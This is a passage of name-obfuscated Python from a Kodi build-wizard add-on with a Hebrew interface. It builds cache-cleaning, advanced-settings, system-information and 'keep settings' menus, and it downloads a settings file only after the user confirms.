		addFile ('--- ניקוי קאש בהפעלה: %s'%O00OO00O000OOO00O .replace ('true',OOOO0O00OO0O00O0O ).replace ('false',OOOOO0000000O0O0O ),'togglesetting','clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2879
		addFile ('--- ניקוי חבילות בהפעלה: %s'%O0O000O0OO00000OO .replace ('true',OOOO0O00OO0O00O0O ).replace ('false',OOOOO0000000O0O0O ),'togglesetting','clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2880
		addFile ('--- ניקוי תמונות ישנות בהפעלה: %s'%OOOOO0OO00OOOO000 .replace ('true',OOOO0O00OO0O00O0O ).replace ('false',OOOOO0000000O0O0O ),'togglesetting','clearthumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2881
	addFile ('ניקוי וידאו קאש','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2882
	addFile ('Include Video Cache in Clear Cache: %s'%OOOOO0OO00OO0O000 .replace ('true',OOOO0O00OO0O00O0O ).replace ('false',OOOOO0000000O0O0O ),'togglecache','includevideo',icon =ICONMAINT ,themeit =THEME3 )#line:2883
	if OOOOO0OO00OO0O000 =='true':#line:2884
		addFile ('--- Include All Video Addons: %s'%OOOOOOOO00OOO00O0 .replace ('true',OOOO0O00OO0O00O0O ).replace ('false',OOOOO0000000O0O0O ),'togglecache','includeall',icon =ICONMAINT ,themeit =THEME3 )#line:2885
		addFile ('--- Include Bob: %s'%OOO000000O0OOO000 .replace ('true',OOOO0O00OO0O00O0O ).replace ('false',OOOOO0000000O0O0O ),'togglecache','includebob',icon =ICONMAINT ,themeit =THEME3 )#line:2886
		addFile ('--- Include Phoenix: %s'%O00OOOOOO0000O0OO .replace ('true',OOOO0O00OO0O00O0O ).replace ('false',OOOOO0000000O0O0O ),'togglecache','includephoenix',icon =ICONMAINT ,themeit =THEME3 )#line:2887
		addFile ('--- Include Specto: %s'%O0000O000O0O00OOO .replace ('true',OOOO0O00OO0O00O0O ).replace ('false',OOOOO0000000O0O0O ),'togglecache','includespecto',icon =ICONMAINT ,themeit =THEME3 )#line:2888
		addFile ('--- Include Exodus: %s'%OOOO0OO0000000OOO .replace ('true',OOOO0O00OO0O00O0O ).replace ('false',OOOOO0000000O0O0O ),'togglecache','includeexodus',icon =ICONMAINT ,themeit =THEME3 )#line:2889
		addFile ('--- Include Salts: %s'%OO0O0OO0O0OO00OOO .replace ('true',OOOO0O00OO0O00O0O ).replace ('false',OOOOO0000000O0O0O ),'togglecache','includesalts',icon =ICONMAINT ,themeit =THEME3 )#line:2890
		addFile ('--- Include Salts HD Lite: %s'%O0OO0OOO000O0O00O .replace ('true',OOOO0O00OO0O00O0O ).replace ('false',OOOOO0000000O0O0O ),'togglecache','includesaltslite',icon =ICONMAINT ,themeit =THEME3 )#line:2891
		addFile ('--- Include One Channel: %s'%O0O000O0O000O000O .replace ('true',OOOO0O00OO0O00O0O ).replace ('false',OOOOO0000000O0O0O ),'togglecache','includeonechan',icon =ICONMAINT ,themeit =THEME3 )#line:2892
		addFile ('--- Include Genesis: %s'%O000O0O00O00O0OOO .replace ('true',OOOO0O00OO0O00O0O ).replace ('false',OOOOO0000000O0O0O ),'togglecache','includegenesis',icon =ICONMAINT ,themeit =THEME3 )#line:2893
		addFile ('--- Enable All Video Addons','togglecache','true',icon =ICONMAINT ,themeit =THEME3 )#line:2894
		addFile ('--- Disable All Video Addons','togglecache','false',icon =ICONMAINT ,themeit =THEME3 )#line:2895
	setView ('files','viewType')#line:2896
def advancedWindow (url =None ):#line:2898
	if not ADVANCEDFILE =='http://':#line:2899
		if url ==None :#line:2900
			OO00O0O0O00OO0OOO =wiz .workingURL (ADVANCEDFILE )#line:2901
			OO0OO00OOOOO0OO0O =uservar .ADVANCEDFILE #line:2902
		else :#line:2903
			OO00O0O0O00OO0OOO =wiz .workingURL (url )#line:2904
			OO0OO00OOOOO0OO0O =url #line:2905
		addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2906
		if os .path .exists (ADVANCED ):#line:2907
			addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2908
			addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2909
		if OO00O0O0O00OO0OOO ==True :#line:2910
			if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONMAINT ,themeit =THEME3 )#line:2911
			O00OO000000O0OO0O =wiz .openURL (OO0OO00OOOOO0OO0O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2912
			OOOOOO0000OO000O0 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O00OO000000O0OO0O )#line:2913
			if len (OOOOOO0000OO000O0 )>0 :#line:2914
				for OO0O0000OOOOO0O00 ,OOO00O0OOOO00O0OO ,url ,OO0O0O00O000O000O ,O0O0OOOOO0OO0OO00 ,OOOOO000O0O00OO00 in OOOOOO0000OO000O0 :#line:2915
					if OOO00O0OOOO00O0OO .lower ()=="yes":#line:2916
						addDir ("[B]%s[/B]"%OO0O0000OOOOO0O00 ,'advancedsetting',url ,description =OOOOO000O0O00OO00 ,icon =OO0O0O00O000O000O ,fanart =O0O0OOOOO0OO0OO00 ,themeit =THEME3 )#line:2917
					else :#line:2918
						addFile (OO0O0000OOOOO0O00 ,'writeadvanced',OO0O0000OOOOO0O00 ,url ,description =OOOOO000O0O00OO00 ,icon =OO0O0O00O000O000O ,fanart =O0O0OOOOO0OO0OO00 ,themeit =THEME2 )#line:2919
			else :wiz .log ("[Advanced Settings] ERROR: Invalid Format.")#line:2920
		else :wiz .log ("[Advanced Settings] URL not working: %s"%OO00O0O0O00OO0OOO )#line:2921
	else :wiz .log ("[Advanced Settings] not Enabled")#line:2922
def writeAdvanced (OOOOOOOO0O00OOOOO ,O00O0O000OO0OOOO0 ):#line:2924
	O0O0O0O0OO00O0000 =wiz .workingURL (O00O0O000OO0OOOO0 )#line:2925
	if O0O0O0O0OO00O0000 ==True :#line:2926
		if os .path .exists (ADVANCED ):OOOOOOO0O0O0O0O00 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to overwrite your current Advanced Settings with [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OOOOOOOO0O00OOOOO ),yeslabel ="[B][COLOR green]Overwrite[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]")#line:2927
		else :OOOOOOO0O0O0O0O00 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OOOOOOOO0O00OOOOO ),yeslabel ="[B][COLOR green]התקנה[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:2928
		if OOOOOOO0O0O0O0O00 ==1 :#line:2930
			O0O0O0OO0O00O0OO0 =wiz .openURL (O00O0O000OO0OOOO0 )#line:2931
			OOOO00O0OO0OO0OOO =open (ADVANCED ,'w');#line:2932
			OOOO00O0OO0OO0OOO .write (O0O0O0OO0O00O0OO0 )#line:2933
			OOOO00O0OO0OO0OOO .close ()#line:2934
			DIALOG .ok (ADDONTITLE ,'[COLOR %s]AdvancedSettings.xml file has been successfully written.  Once you click okay it will force close kodi.[/COLOR]'%COLOR2 )#line:2935
			wiz .killxbmc (True )#line:2936
		else :wiz .log ("[Advanced Settings] install canceled");wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Write Cancelled![/COLOR]"%COLOR2 );return #line:2937
	else :wiz .log ("[Advanced Settings] URL not working: %s"%O0O0O0O0OO00O0000 );wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]URL Not Working[/COLOR]"%COLOR2 )#line:2938
def viewAdvanced ():#line:2940
	OOO0OO000O00O0OO0 =open (ADVANCED )#line:2941
	OO000OO0OOO00O0OO =OOO0OO000O00O0OO0 .read ().replace ('\t','    ')#line:2942
	wiz .TextBox (ADDONTITLE ,OO000OO0OOO00O0OO )#line:2943
	OOO0OO000O00O0OO0 .close ()#line:2944
def removeAdvanced ():#line:2946
	if os .path .exists (ADVANCED ):#line:2947
		wiz .removeFile (ADVANCED )#line:2948
	else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]AdvancedSettings.xml not found[/COLOR]")#line:2949
def showAutoAdvanced ():#line:2951
	notify .autoConfig ()#line:2952
def getIP ():#line:2954
	O0O00OOO00000O00O ='http://whatismyipaddress.com/'#line:2955
	if not wiz .workingURL (O0O00OOO00000O00O ):return 'Unknown','Unknown','Unknown'#line:2956
	OOOOOOO0000O000OO =wiz .openURL (O0O00OOO00000O00O ).replace ('\n','').replace ('\r','')#line:2957
	if not 'Access Denied'in OOOOOOO0000O000OO :#line:2958
		OOO0O0OOOOOOOO00O =re .compile ('whatismyipaddress.com/ip/(.+?)"').findall (OOOOOOO0000O000OO )#line:2959
		OO00OOO0OOOOO0000 =OOO0O0OOOOOOOO00O [0 ]if (len (OOO0O0OOOOOOOO00O )>0 )else 'Unknown'#line:2960
		O00O00O0OOOOO0OO0 =re .compile ('"font-size:14px;">(.+?)</td>').findall (OOOOOOO0000O000OO )#line:2961
		OOOO0000000OOOO0O =O00O00O0OOOOO0OO0 [0 ]if (len (O00O00O0OOOOO0OO0 )>0 )else 'Unknown'#line:2962
		OOO0OO0O0OOO0O0O0 =O00O00O0OOOOO0OO0 [1 ]+', '+O00O00O0OOOOO0OO0 [2 ]+', '+O00O00O0OOOOO0OO0 [3 ]if (len (O00O00O0OOOOO0OO0 )>2 )else 'Unknown'#line:2963
		return OO00OOO0OOOOO0000 ,OOOO0000000OOOO0O ,OOO0OO0O0OOO0O0O0 #line:2964
	else :return 'Unknown','Unknown','Unknown'#line:2965
def systemInfo ():#line:2967
	O0OO00OOOOO00O0O0 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:2981
	O000O00000O00O0OO =[];OOOO00O0O0OOO0O0O =0 #line:2982
	for OO0O0O00O0O00OOOO in O0OO00OOOOO00O0O0 :#line:2983
		O0O0000O0000OOOO0 =wiz .getInfo (OO0O0O00O0O00OOOO )#line:2984
		O00O0OOO0O0000OOO =0 #line:2985
		while O0O0000O0000OOOO0 =="Busy"and O00O0OOO0O0000OOO <10 :#line:2986
			O0O0000O0000OOOO0 =wiz .getInfo (OO0O0O00O0O00OOOO );O00O0OOO0O0000OOO +=1 ;wiz .log ("%s sleep %s"%(OO0O0O00O0O00OOOO ,str (O00O0OOO0O0000OOO )));xbmc .sleep (1000 )#line:2987
		O000O00000O00O0OO .append (O0O0000O0000OOOO0 )#line:2988
		OOOO00O0O0OOO0O0O +=1 #line:2989
	O000O0O0OO0000OOO =O000O00000O00O0OO [8 ]if 'Una'in O000O00000O00O0OO [8 ]else wiz .convertSize (int (float (O000O00000O00O0OO [8 ][:-8 ]))*1024 *1024 )#line:2990
	OOO00O0O0O0000OO0 =O000O00000O00O0OO [9 ]if 'Una'in O000O00000O00O0OO [9 ]else wiz .convertSize (int (float (O000O00000O00O0OO [9 ][:-8 ]))*1024 *1024 )#line:2991
	OOO0O0000O0OO0O0O =O000O00000O00O0OO [10 ]if 'Una'in O000O00000O00O0OO [10 ]else wiz .convertSize (int (float (O000O00000O00O0OO [10 ][:-8 ]))*1024 *1024 )#line:2992
	OO0O0O000OOOO0OO0 =wiz .convertSize (int (float (O000O00000O00O0OO [11 ][:-2 ]))*1024 *1024 )#line:2993
	O00OOO00OO00OOOO0 =wiz .convertSize (int (float (O000O00000O00O0OO [12 ][:-2 ]))*1024 *1024 )#line:2994
	OO000OO0OO00O00O0 =wiz .convertSize (int (float (O000O00000O00O0OO [13 ][:-2 ]))*1024 *1024 )#line:2995
	O0O00OO00OOO0O00O ,OOOO0OOOO0O0000OO ,OO000OO000O00OO00 =getIP ()#line:2996
	O0OO0O0OOOOOOO0O0 =[];O0O0O00000000OOOO =[];O0O0OO0O0OOO000OO =[];OOOOOOO0OOOO0OO00 =[];OOO0O000OO00OO000 =[];O0O0000O00000OO00 =[];O0O0OO000O000OOOO =[]#line:2998
	OO0000OOO00O0OOO0 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3000
	for O0OO0O00O0O000O00 in sorted (OO0000OOO00O0OOO0 ,key =lambda OO00OO000OOOOOO0O :OO00OO000OOOOOO0O ):#line:3001
		OOO0000OOO00O00O0 =os .path .split (O0OO0O00O0O000O00 [:-1 ])[1 ]#line:3002
		if OOO0000OOO00O00O0 =='packages':continue #line:3003
		OO0OOOO0OO00OOO00 =os .path .join (O0OO0O00O0O000O00 ,'addon.xml')#line:3004
		if os .path .exists (OO0OOOO0OO00OOO00 ):#line:3005
			O00O0OO000O00OO00 =open (OO0OOOO0OO00OOO00 )#line:3006
			O0O000O0O0O0O000O =O00O0OO000O00OO00 .read ()#line:3007
			OOO00OOO0000000OO =re .compile ("<provides>(.+?)</provides>").findall (O0O000O0O0O0O000O )#line:3008
			if len (OOO00OOO0000000OO )==0 :#line:3009
				if OOO0000OOO00O00O0 .startswith ('skin'):O0O0OO000O000OOOO .append (OOO0000OOO00O00O0 )#line:3010
				if OOO0000OOO00O00O0 .startswith ('repo'):OOO0O000OO00OO000 .append (OOO0000OOO00O00O0 )#line:3011
				else :O0O0000O00000OO00 .append (OOO0000OOO00O00O0 )#line:3012
			elif not (OOO00OOO0000000OO [0 ]).find ('executable')==-1 :OOOOOOO0OOOO0OO00 .append (OOO0000OOO00O00O0 )#line:3013
			elif not (OOO00OOO0000000OO [0 ]).find ('video')==-1 :O0O0OO0O0OOO000OO .append (OOO0000OOO00O00O0 )#line:3014
			elif not (OOO00OOO0000000OO [0 ]).find ('audio')==-1 :O0O0O00000000OOOO .append (OOO0000OOO00O00O0 )#line:3015
			elif not (OOO00OOO0000000OO [0 ]).find ('image')==-1 :O0OO0O0OOOOOOO0O0 .append (OOO0000OOO00O00O0 )#line:3016
	addFile ('[B]Media Center Info:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3018
	addFile ('[COLOR %s]Name:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O00000O00O0OO [0 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3019
	addFile ('[COLOR %s]Version:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O00000O00O0OO [1 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3020
	addFile ('[COLOR %s]Platform:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,wiz .platform ().title ()),'',icon =ICONMAINT ,themeit =THEME3 )#line:3021
	addFile ('[COLOR %s]CPU Usage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O00000O00O0OO [2 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3022
	addFile ('[COLOR %s]Screen Mode:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O00000O00O0OO [3 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3023
	addFile ('[B]Uptime:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3025
	addFile ('[COLOR %s]Current Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O00000O00O0OO [6 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3026
	addFile ('[COLOR %s]Total Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O00000O00O0OO [7 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3027
	addFile ('[B]Local Storage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3029
	addFile ('[COLOR %s]Used Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O0O0OO0000OOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3030
	addFile ('[COLOR %s]Free Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO00O0O0O0000OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3031
	addFile ('[COLOR %s]Total Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0O0000O0OO0O0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3032
	addFile ('[B]Ram Usage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3034
	addFile ('[COLOR %s]Used Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0O0O000OOOO0OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3035
	addFile ('[COLOR %s]Free Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00OOO00OO00OOOO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3036
	addFile ('[COLOR %s]Total Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO000OO0OO00O00O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3037
	addFile ('[B]Network:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3039
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O00000O00O0OO [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3040
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O00OO00OOO0O00O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3041
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOO0OOOO0O0000OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3042
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO000OO000O00OO00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3043
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O00000O00O0OO [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3044
	OOOOOO00OO0000O0O =len (O0OO0O0OOOOOOO0O0 )+len (O0O0O00000000OOOO )+len (O0O0OO0O0OOO000OO )+len (OOOOOOO0OOOO0OO00 )+len (O0O0000O00000OO00 )+len (O0O0OO000O000OOOO )+len (OOO0O000OO00OO000 )#line:3046
	addFile ('[B]Addons([COLOR %s]%s[/COLOR]):[/B]'%(COLOR1 ,OOOOOO00OO0000O0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3047
	addFile ('[COLOR %s]Video Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0O0OO0O0OOO000OO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3048
	addFile ('[COLOR %s]Program Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOOOOOO0OOOO0OO00 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3049
	addFile ('[COLOR %s]Music Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0O0O00000000OOOO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3050
	addFile ('[COLOR %s]Picture Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0OO0O0OOOOOOO0O0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3051
	addFile ('[COLOR %s]Repositories:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOO0O000OO00OO000 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3052
	addFile ('[COLOR %s]Skins:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0O0OO000O000OOOO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3053
	addFile ('[COLOR %s]Scripts/Modules:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0O0000O00000OO00 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3054
def Menu ():#line:3055
	addDir ('אפשרויות נוספות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:3056
def saveMenu ():#line:3058
	O0O00O000O00OO00O ='[COLOR yellow]מופעל[/COLOR]';OOOOOO00OOOO00OOO ='[COLOR blue]מבוטל[/COLOR]'#line:3060
	O000OO00O00O0OO00 ='true'if KEEPMOVIEWALL =='true'else 'false'#line:3061
	OOOO0O0OOO00O00O0 ='true'if KEEPMOVIELIST =='true'else 'false'#line:3062
	OOO000O00O0000O00 ='true'if KEEPINFO =='true'else 'false'#line:3063
	O0O00O0OOO0O00000 ='true'if KEEPSOUND =='true'else 'false'#line:3065
	OO0OO000OO0OOOOO0 ='true'if KEEPVIEW =='true'else 'false'#line:3066
	OO00O0OOOOO0OO00O ='true'if KEEPSKIN =='true'else 'false'#line:3067
	OO000OO00O00OOOO0 ='true'if KEEPSKIN2 =='true'else 'false'#line:3068
	OO0O00OO0OO00OO00 ='true'if KEEPSKIN3 =='true'else 'false'#line:3069
	OO00000OOOO0OOO00 ='true'if KEEPADDONS =='true'else 'false'#line:3070
	OOOO00000OO0O0O00 ='true'if KEEPPVR =='true'else 'false'#line:3071
	O0O0OO0OOOO0O0O0O ='true'if KEEPTVLIST =='true'else 'false'#line:3072
	OOO000O00OOOO0O00 ='true'if KEEPHUBMOVIE =='true'else 'false'#line:3073
	OOO0O00OO0O0O0O0O ='true'if KEEPHUBTVSHOW =='true'else 'false'#line:3074
	OOO0OO0O000O00OO0 ='true'if KEEPHUBTV =='true'else 'false'#line:3075
	O00O000OOOOO0O00O ='true'if KEEPHUBVOD =='true'else 'false'#line:3076
	OO00OOOO00O00O0O0 ='true'if KEEPHUBSPORT =='true'else 'false'#line:3077
	O0O0OO0000OO0O0O0 ='true'if KEEPHUBKIDS =='true'else 'false'#line:3078
	O00O00OO0OO0O0O0O ='true'if KEEPHUBMUSIC =='true'else 'false'#line:3079
	O0000O0OOO000OO00 ='true'if KEEPHUBMENU =='true'else 'false'#line:3080
	O0OOO00O0O000OOO0 ='true'if KEEPPLAYLIST =='true'else 'false'#line:3081
	OO000OOOOO0000000 ='true'if KEEPTRAKT =='true'else 'false'#line:3082
	OO0OO0OOO0OOO0O00 ='true'if KEEPREAL =='true'else 'false'#line:3083
	OOO000000O000O00O ='true'if KEEPRD2 =='true'else 'false'#line:3084
	O0O00O0OO0OOOOO00 ='true'if KEEPTORNET =='true'else 'true'#line:3085
	OO00O00O00OOOOOO0 ='true'if KEEPLOGIN =='true'else 'false'#line:3086
	OO000O0O0O0OOO000 ='true'if KEEPSOURCES =='true'else 'false'#line:3087
	O0OO0O000OOOOO000 ='true'if KEEPADVANCED =='true'else 'false'#line:3088
	OOOOO000O00OOOO00 ='true'if KEEPPROFILES =='true'else 'false'#line:3089
	O0OOOOOO00O0000OO ='true'if KEEPFAVS =='true'else 'false'#line:3090
	OOO00O0OOOO0000OO ='true'if KEEPREPOS =='true'else 'false'#line:3091
	OOO0O0O00000000OO ='true'if KEEPSUPER =='true'else 'false'#line:3092
	OO0O0OO0O000O00O0 ='true'if KEEPWHITELIST =='true'else 'false'#line:3093
	O0OOOO00000OO0O00 ='true'if KEEPWEATHER =='true'else 'false'#line:3094
	if OO0O0OO0O000O00O0 =='true':#line:3098
		addFile ('בחר הרחבות לשמירה','whitelist','edit',icon =ICONSAVE ,themeit =THEME1 )#line:3099
		addFile ('רשימת ההרחבות שבחרתי לשמור','whitelist','view',icon =ICONSAVE ,themeit =THEME1 )#line:3100
		addFile ('נקה רשימת הרחבות','whitelist','clear',icon =ICONSAVE ,themeit =THEME1 )#line:3101
		addFile ('יבה רשימת הרחבות','whitelist','import',icon =ICONSAVE ,themeit =THEME1 )#line:3102
		addFile ('יצא רשימת הרחבות','whitelist','export',icon =ICONSAVE ,themeit =THEME1 )#line:3103
	addFile ('%s התקנת קיר סרטים: '%O000OO00O00O0OO00 .replace ('true',O0O00O000O00OO00O ).replace ('false',OOOOOO00OOOO00OOO ),'togglesetting','keepmoviewall',icon =ICONTRAKT ,themeit =THEME1 )#line:3105
	addFile ('%s שמירת חשבון RD:  '%OO0OO0OOO0OOO0O00 .replace ('true',O0O00O000O00OO00O ).replace ('false',OOOOOO00OOOO00OOO ),'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME1 )#line:3106
	addFile ('%s שמירת חשבון טראקט:  '%OO000OOOOO0000000 .replace ('true',O0O00O000O00OO00O ).replace ('false',OOOOOO00OOOO00OOO ),'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME1 )#line:3107
	addFile ('%s שמירת מועדפים:  '%O0OOOOOO00O0000OO .replace ('true',O0O00O000O00OO00O ).replace ('false',OOOOOO00OOOO00OOO ),'togglesetting','keepfavourites',icon =ICONSAVE ,themeit =THEME1 )#line:3110
	addFile ('%s שמירת לקוח טלוויזיה:  '%OOOO00000OO0O0O00 .replace ('true',O0O00O000O00OO00O ).replace ('false',OOOOOO00OOOO00OOO ),'togglesetting','keeppvr',icon =ICONTRAKT ,themeit =THEME1 )#line:3111
	addFile ('%s שמירת רשימת עורצי טלוויזיה:  '%O0O0OO0OOOO0O0O0O .replace ('true',O0O00O000O00OO00O ).replace ('false',OOOOOO00OOOO00OOO ),'togglesetting','keeptvlist',icon =ICONTRAKT ,themeit =THEME1 )#line:3112
	addFile ('%s שמירת אריח סרטים:  '%OOO000O00OOOO0O00 .replace ('true',O0O00O000O00OO00O ).replace ('false',OOOOOO00OOOO00OOO ),'togglesetting','keephubmovie',icon =ICONTRAKT ,themeit =THEME1 )#line:3113
	addFile ('%s שמירת אריח סדרות:  '%OOO0O00OO0O0O0O0O .replace ('true',O0O00O000O00OO00O ).replace ('false',OOOOOO00OOOO00OOO ),'togglesetting','keephubtvshow',icon =ICONTRAKT ,themeit =THEME1 )#line:3114
	addFile ('%s שמירת אריח טלויזיה:  '%OOO0OO0O000O00OO0 .replace ('true',O0O00O000O00OO00O ).replace ('false',OOOOOO00OOOO00OOO ),'togglesetting','keephubtv',icon =ICONTRAKT ,themeit =THEME1 )#line:3115
	addFile ('%s שמירת אריח תוכן ישראלי:  '%O00O000OOOOO0O00O .replace ('true',O0O00O000O00OO00O ).replace ('false',OOOOOO00OOOO00OOO ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3116
	addFile ('%s שמירת אריח ספורט:  '%OO00OOOO00O00O0O0 .replace ('true',O0O00O000O00OO00O ).replace ('false',OOOOOO00OOOO00OOO ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3117
	addFile ('%s שמירת אריח ילדים:  '%O0O0OO0000OO0O0O0 .replace ('true',O0O00O000O00OO00O ).replace ('false',OOOOOO00OOOO00OOO ),'togglesetting','keephubkids',icon =ICONTRAKT ,themeit =THEME1 )#line:3118
	addFile ('%s שמירת אריח מוסיקה:  '%O00O00OO0OO0O0O0O .replace ('true',O0O00O000O00OO00O ).replace ('false',OOOOOO00OOOO00OOO ),'togglesetting','keephubmusic',icon =ICONTRAKT ,themeit =THEME1 )#line:3119
	addFile ('%s שמירת תפריט אריחים ראשי:  '%O0000O0OOO000OO00 .replace ('true',O0O00O000O00OO00O ).replace ('false',OOOOOO00OOOO00OOO ),'togglesetting','keephubmenu',icon =ICONTRAKT ,themeit =THEME1 )#line:3120
	addFile ('%s שמירת כל האריחים בסקין:  '%OO00O0OOOOO0OO00O .replace ('true',O0O00O000O00OO00O ).replace ('false',OOOOOO00OOOO00OOO ),'togglesetting','keepskin',icon =ICONTRAKT ,themeit =THEME1 )#line:3121
	addFile ('%s שמירת הגדרות מזג האוויר:  '%O0OOOO00000OO0O00 .replace ('true',O0O00O000O00OO00O ).replace ('false',OOOOOO00OOOO00OOO ),'togglesetting','keepweather',icon =ICONTRAKT ,themeit =THEME1 )#line:3122
	addFile ('%s שמירת הרחבות שהתקנתי:  '%OO00000OOOO0OOO00 .replace ('true',O0O00O000O00OO00O ).replace ('false',OOOOOO00OOOO00OOO ),'togglesetting','keepaddons',icon =ICONTRAKT ,themeit =THEME1 )#line:3128
	addFile ('%s שמירת סיסמאות, חשבונות ,מיקומי הורדות:  '%OOO000O00O0000O00 .replace ('true',O0O00O000O00OO00O ).replace ('false',OOOOOO00OOOO00OOO ),'togglesetting','keepinfo',icon =ICONTRAKT ,themeit =THEME1 )#line:3129
	addFile ('%s שמירת ספריית סרטים וסדרות:  '%OOOO0O0OOO00O00O0 .replace ('true',O0O00O000O00OO00O ).replace ('false',OOOOOO00OOOO00OOO ),'togglesetting','keepmovielist',icon =ICONTRAKT ,themeit =THEME1 )#line:3132
	addFile ('%s שמירת מקורות וידאו:  '%OO000O0O0O0OOO000 .replace ('true',O0O00O000O00OO00O ).replace ('false',OOOOOO00OOOO00OOO ),'togglesetting','keepsources',icon =ICONSAVE ,themeit =THEME1 )#line:3133
